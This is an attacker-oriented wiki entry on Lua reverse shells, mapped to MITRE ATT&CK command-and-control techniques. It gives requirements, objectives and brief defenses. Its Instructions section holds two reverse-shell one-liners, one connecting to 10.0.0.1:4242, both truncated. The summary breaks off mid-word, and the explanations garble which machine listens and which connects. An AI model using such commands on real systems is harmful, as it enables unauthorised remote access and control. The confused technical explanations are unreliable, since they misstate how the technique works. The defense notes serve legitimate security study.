---
id: fb5826d1-20d4-4a34-9bf3-31f66fc5e74e
name: Lua Reverse Shell Cheat Sheet
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:24.654256+00:00'
updated_at: '2023-04-10T20:25:24.200012+00:00'
tactics:
- '[[Command and Control|TA0011 - Command and Control]]'
techniques:
- '[[Custom Command and Control Protocol|T1094 - Custom Command and Control Protocol]]'
- '[[Remote Access Tools|T1219 - Remote Access Tools]]'
tags:
- '[[Lua]]'
- '[[Reverse Shell]]'
- '[[Reverse Shell Cheat Sheet]]'
---

# Lua Reverse Shell Cheat Sheet

## Summary

A Lua reverse shell can be used by an attacker to gain remote access to a compromised system. This is achieved by executing a Lua script on the victim machine that connects back to the attacker's machine, allowing the attacker to execute commands on the victim machine remotely. This technique can b

## Description

# Description

A Lua reverse shell can be used by an attacker to gain remote access to a compromised system. This is achieved by executing a Lua script on the victim machine that connects back to the attacker's machine, allowing the attacker to execute commands on the victim machine remotely. This technique can be particularly useful for bypassing firewalls and other network security measures, as the reverse shell connection can be initiated from within the victim's network.

To use this technique, the attacker must first upload a Lua script to the victim machine. This can be accomplished through a variety of means, such as exploiting a vulnerability or using social engineering to trick the victim into downloading and executing the script. Once the script is on the victim machine, the attacker can initiate a reverse shell connection by running a command on their own machine that listens for incoming connections from the victim machine.

From a business perspective, this technique can be used to gain access to sensitive data or systems, which can then be used for further attacks or for extortion purposes.

## Requirements

1. The victim machine must have Lua installed

1. The attacker must be able to upload a Lua script to the victim machine

1. The attacker must have a machine with a publicly accessible IP address to listen for incoming connections

## Defense

1. Ensure that Lua is not installed on systems where it is not needed

1. Implement network segmentation to limit the impact of a compromised system

1. Monitor for unusual network traffic, such as connections to known malicious IP addresses

## Objectives

1. Gain remote access to a compromised system

1. Execute commands on the victim machine remotely

1. Bypass network security measures

# Instructions

1. This command allows you to remotely access the shell of a Linux machine using a Lua script. To use this command, you must have the Lua interpreter installed on your local machine and have network access to the target machine. The command establishes a TCP connection to the target machine and executes a shell command on it, giving you remote access to the shell.

**Code**: [[lua -e "require('socket');require('os');t=socket.t]]

> The command takes two arguments: the IP address of the target machine and the port number to use for the TCP connection. The Lua script then executes a shell command on the target machine, giving you remote access to the shell. Note that this command only works on Linux machines and requires Lua and socket libraries to be installed on your local machine.

2. To use this command, first ensure that the target machine is listening on the specified host and port. Then, execute this command on the machine from which you want to remotely execute commands. Once executed, you can remotely execute commands on the target machine by sending them to the specified host and port.

**Code**: [[lua5.1 -e 'local host, port = "10.0.0.1", 4242 loc]]

> This command allows you to remotely execute commands on a target machine. The command opens a TCP connection to the specified host and port, and waits for commands to be received. When a command is received, it is executed on the target machine and the output is sent back to the machine that executed the command. This allows you to execute commands on a machine without physically being present at the machine.

## MITRE ATT&CK Mapping

### Tactics

- [[Command and Control|TA0011 - Command and Control]]

### Techniques

- [[Custom Command and Control Protocol|T1094 - Custom Command and Control Protocol]]
- [[Remote Access Tools|T1219 - Remote Access Tools]]

## Tags

- [[Lua]]
- [[Reverse Shell]]
- [[Reverse Shell Cheat Sheet]]
